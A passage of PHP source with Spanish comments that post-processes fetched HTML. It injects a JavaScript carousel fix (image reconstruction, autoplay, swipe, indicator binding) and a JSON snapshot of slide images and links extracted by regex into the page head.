      . "        if (!img || (!img.getAttribute('src') && window.__FB_SLIDES__ && window.__FB_SLIDES__[i])){\n"
      . "          // Intentar reconstruir desde snapshot\n"
      . "          if (window.__FB_SLIDES__ && window.__FB_SLIDES__[i]){\n"
      . "            var data = window.__FB_SLIDES__[i];\n"
      . "            var pic = sl.querySelector('picture');\n"
      . "            if (pic && data.src){\n"
      . "              var newImg = pic.querySelector('img');\n"
      . "              if (newImg){\n"
      . "                newImg.setAttribute('src', data.src);\n"
      . "                newImg.setAttribute('alt', data.alt || '');\n"
      . "                rebuilt++;\n"
      . "              } else {\n"
      . "                var ni = document.createElement('img');\n"
      . "                ni.setAttribute('src', data.src);\n"
      . "                ni.setAttribute('alt', data.alt || '');\n"
      . "                ni.setAttribute('data-testid', 'one-clickable-container');\n"
      . "                ni.style.width = '100%'; ni.style.height = 'auto';\n"
      . "                pic.appendChild(ni);\n"
      . "                rebuilt++;\n"
      . "              }\n"
      . "            }\n"
      . "          }\n"
      . "        }\n"
      . "      });\n"
      . "\n"
      . "      // ---- B) Estado actual ----\n"
      . "      var current = 0;\n"
      . "      var timer = null;\n"
      . "      var indicators = showcase.querySelectorAll('.Wheelndicatorstyle__Indicator-core-ui-kit__sc-1t9jfqs-1');\n"
      . "      var prevBtn = showcase.querySelector('.carousel-v2-control-prev');\n"
      . "      var nextBtn = showcase.querySelector('.carousel-v2-control-next');\n"
      . "\n"
      . "      // ---- C) Función para ir a una slide ----\n"
      . "      function goToSlide(i){\n"
      . "        var n = slides.length;\n"
      . "        current = ((i % n) + n) % n;\n"
      . "        slides.forEach(function(sl, j){\n"
      . "          if (j === current) sl.classList.add('active');\n"
      . "          else sl.classList.remove('active');\n"
      . "        });\n"
      . "        indicators.forEach(function(ind, j){\n"
      . "          if (j === current) ind.classList.add('active');\n"
      . "          else ind.classList.remove('active');\n"
      . "        });\n"
      . "        restartAutoplay();\n"
      . "      }\n"
      . "      function next(){ goToSlide(current + 1); }\n"
      . "      function prev(){ goToSlide(current - 1); }\n"
      . "\n"
      . "      // ---- D) Autoplay cada 4.5s ----\n"
      . "      function restartAutoplay(){\n"
      . "        if (timer) clearInterval(timer);\n"
      . "        timer = setInterval(next, 4500);\n"
      . "      }\n"
      . "\n"
      . "      // ---- E) Bindear controles ----\n"
      . "      if (nextBtn && !nextBtn.__fb_bound){\n"
      . "        nextBtn.addEventListener('click', function(e){ e.preventDefault(); e.stopPropagation(); next(); });\n"
      . "        nextBtn.__fb_bound = true;\n"
      . "      }\n"
      . "      if (prevBtn && !prevBtn.__fb_bound){\n"
      . "        prevBtn.addEventListener('click', function(e){ e.preventDefault(); e.stopPropagation(); prev(); });\n"
      . "        prevBtn.__fb_bound = true;\n"
      . "      }\n"
      . "\n"
      . "      // ---- F) Indicadores clickeables ----\n"
      . "      indicators.forEach(function(ind, j){\n"
      . "        if (!ind.__fb_bound){\n"
      . "          ind.addEventListener('click', function(e){\n"
      . "            e.preventDefault(); e.stopPropagation();\n"
      . "            goToSlide(j);\n"
      . "          });\n"
      . "          ind.__fb_bound = true;\n"
      . "        }\n"
      . "      });\n"
      . "\n"
      . "      // ---- G) Swipe táctil ----\n"
      . "      var touchStartX = 0;\n"
      . "      showcase.addEventListener('touchstart', function(e){ touchStartX = e.touches[0].clientX; }, {passive: true});\n"
      . "      showcase.addEventListener('touchend', function(e){\n"
      . "        var dx = e.changedTouches[0].clientX - touchStartX;\n"
      . "        if (Math.abs(dx) > 50) { if (dx > 0) prev(); else next(); }\n"
      . "      }, {passive: true});\n"
      . "\n"
      . "      // ---- H) Pausar al hover ----\n"
      . "      showcase.addEventListener('mouseenter', function(){ if (timer) clearInterval(timer); });\n"
      . "      showcase.addEventListener('mouseleave', restartAutoplay);\n"
      . "\n"
      . "      // ---- I) Inicializar estado ----\n"
      . "      // Determinar slide activa inicial (la que tenga .active o la 0)\n"
      . "      current = 0;\n"
      . "      slides.forEach(function(sl, j){ if (sl.classList.contains('active')) current = j; });\n"
      . "      // Si ninguna activa o hay múltiples activas, normalizar a slide 0\n"
      . "      if (document.querySelectorAll('[data-testid^=\"showcase-slide\"].active').length !== 1){\n"
      . "        slides.forEach(function(sl, j){ sl.classList.remove('active'); });\n"
      . "        current = 0;\n"
      . "      }\n"
      . "      slides[current].classList.add('active');\n"
      . "      indicators.forEach(function(ind, j){\n"
      . "        if (j === current) ind.classList.add('active');\n"
      . "        else ind.classList.remove('active');\n"
      . "      });\n"
      . "\n"
      . "      // ---- J) Arrancar autoplay ----\n"
      . "      restartAutoplay();\n"
      . "    });\n"
      . "  }\n"
      . "\n"
      . "  // ---- 3) EJECUTAR EN VARIAS FASES ----\n"
      . "  if (document.readyState === 'loading'){ document.addEventListener('DOMContentLoaded', function(){ reconstruirImagenes(); capturarSlides(); iniciarSlider(); }); }\n"
      . "  else { reconstruirImagenes(); capturarSlides(); iniciarSlider(); }\n"
      . "  // Reintentos para cuando React re-renderiza y borra el DOM\n"
      . "  setTimeout(function(){ reconstruirImagenes(); capturarSlides(); iniciarSlider(); }, 500);\n"
      . "  setTimeout(function(){ reconstruirImagenes(); capturarSlides(); iniciarSlider(); }, 1500);\n"
      . "  setTimeout(function(){ reconstruirImagenes(); capturarSlides(); iniciarSlider(); }, 4000);\n"
      . "  window.addEventListener('load', function(){ setTimeout(function(){ reconstruirImagenes(); capturarSlides(); iniciarSlider(); }, 300); });\n"
      . "  // Observador de mutaciones: si React reemplaza el DOM, re-aplicar\n"
      . "  var obs = new MutationObserver(function(){ reconstruirImagenes(); iniciarSlider(); });\n"
      . "  document.addEventListener('DOMContentLoaded', function(){\n"
      . "    var sc = document.querySelector('[data-testid=\"showcase\"]');\n"
      . "    if (sc) obs.observe(sc, { childList: true, subtree: true });\n"
      . "  });\n"
      . "})();\n"
      . "</script>";
    $html = str_replace('</body>', $fixSlider . "\n</body>", $html);

    return $html;
}

/**
 * Inyecta data-fb-img / data-fb-href / data-fb-alt en cada slide del showcase
 * principal, extrayendo las URLs de las imágenes y los links directamente del
 * HTML estático (antes de que React las elimine del DOM en el navegador).
 * El JS del slider usa estos atributos como fuente de verdad para reconstruir
 * las imágenes si React las borra durante la hidratación.
 */
function inyectarSliderData($html) {
    $start = strpos($html, 'data-testid="showcase"');
    if ($start === false) return $html;
    $end = strpos($html, 'carousel-v2-control-next', $start);
    if ($end === false) $end = $start + 30000;
    $block = substr($html, $start, $end - $start + 30);

    $slidesData = [];

    // Extraer datos de cada slide: src, alt, href
    if (preg_match_all(
        '#<div[^>]*data-testid="showcase-slide-\d+"[^>]*>.*?(?:<picture>.*?</picture>|<div class="lazyload-placeholder"></div>|</div>)#s',
        $block,
        $matches
    )) {
        foreach ($matches[0] as $slideHtml) {
            $imgSrc = '';
            $alt = '';
            if (preg_match('#<img[^>]*src="([^"]*)"[^>]*>#', $slideHtml, $m)) {
                $imgSrc = $m[1];
            }
            if (preg_match('#<img[^>]*alt="([^"]*)"[^>]*>#', $slideHtml, $m)) {
                $alt = $m[1];
            }
            if ($imgSrc === '') {
                if (preg_match('#<source[^>]*srcset="([^"]+)"#', $slideHtml, $m)) {
                    $parts = explode(' ', $m[1]);
                    $imgSrc = $parts[0];
                }
            }
            $href = '';
            if (preg_match('#<a[^>]*data-testid="main-clickable-container"[^>]*href="([^"]*)"#', $slideHtml, $m)) {
                $href = $m[1];
            }
            if ($href === '' && preg_match('#<a[^>]*class="Linkstyle[^"]*"[^>]*href="([^"]*)"#', $slideHtml, $m)) {
                $href = $m[1];
            }
            if ($imgSrc === '') continue;

            $slidesData[] = [
                'src' => str_replace('&amp;', '&', $imgSrc),
                'alt' => $alt,
                'href' => $href
            ];
        }
    }

    if (count($slidesData) === 0) return $html;

    // Inyectar script global en <head> con el snapshot de datos
    $json = json_encode($slidesData, JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP | JSON_HEX_TAG);
    $headScript = "<script>\n"
      . "window.__FB_SLIDER_DATA__ = " . $json . ";\n"
      . "if (!window.__FB_SLIDER_POOL__) window.__FB_SLIDER_POOL__ = window.__FB_SLIDER_DATA__;\n"
      . "</script>";

    // Insertar justo después de <head>
    if (strpos($html, '<head>') !== false) {
        $html = str_replace('<head>', "<head>\n" . $headScript, $html);
    } else {
        $html = $headScript . "\n" . $html;
    }

    return $html;
}
